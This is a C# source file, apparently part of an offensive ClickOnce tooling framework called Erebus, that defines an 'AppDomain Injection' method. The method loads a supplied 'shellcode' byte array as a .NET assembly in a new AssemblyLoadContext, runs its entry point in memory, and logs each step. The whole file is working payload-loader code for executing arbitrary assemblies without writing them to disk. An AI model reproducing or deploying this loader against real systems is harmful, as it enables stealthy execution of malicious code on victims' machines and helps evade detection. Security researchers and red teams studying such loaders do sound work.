using System;
using System.Runtime.Versioning;
using System.Runtime.Loader;

namespace Erebus.ClickOnce.Injections
{
    [SupportedOSPlatform("windows")]
    public class AppDomainInjection : IInjectionMethod
    {
        public string Name => "AppDomain Injection";
        public string Description => "Self-injection into managed AppDomain (.NET assembly execution)";

        public bool Inject(byte[] shellcode, int targetPid = 0)
        {
            try
            {
                DebugLogger.WriteLine("[+] Creating new AssemblyLoadContext for assembly execution...");

                // Create a new AssemblyLoadContext
                AssemblyLoadContext alc = new AssemblyLoadContext("InjectionContext", isCollectible: true);

                DebugLogger.WriteLine($"[+] AssemblyLoadContext created: InjectionContext");

                // Load assembly from shellcode bytes
                try
                {
                    DebugLogger.WriteLine("[+] Loading assembly from shellcode bytes...");
                    System.Reflection.Assembly assembly = alc.LoadFromStream(new System.IO.MemoryStream(shellcode));

                    if (assembly == null)
                    {
                        DebugLogger.WriteLine("[-] Failed to load assembly");
                        alc.Unload();
                        return false;
                    }

                    DebugLogger.WriteLine($"[+] Assembly loaded: {assembly.GetName().Name}");

                    // Get the entry point (Main method)
                    System.Reflection.MethodInfo? entryPoint = assembly.EntryPoint;

                    if (entryPoint == null)
                    {
                        DebugLogger.WriteLine("[-] Assembly has no entry point (Main method)");
                        alc.Unload();
                        return false;
                    }

                    DebugLogger.WriteLine($"[+] Entry point found: {entryPoint.Name}");

                    // Execute the assembly's Main method
                    DebugLogger.WriteLine("[+] Executing assembly...");
                    object? result = entryPoint?.Invoke(null, new object[] { new string[] { } });

                    DebugLogger.WriteLine("[+] Assembly execution completed");

                    // Unload the AssemblyLoadContext
                    alc.Unload();
                    DebugLogger.WriteLine("[+] AssemblyLoadContext unloaded");

                    return true;
                }
                catch (Exception assemblyEx)
                {
                    DebugLogger.WriteLine($"[-] Assembly execution failed: {assemblyEx.Message}");
                    try
                    {
                        alc.Unload();
                    }
                    catch
                    {
                        // Suppress unload errors
                    }
                    return false;
                }
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"[-] Assembly injection failed: {ex.Message}");
                return false;
            }
        }
    }
}
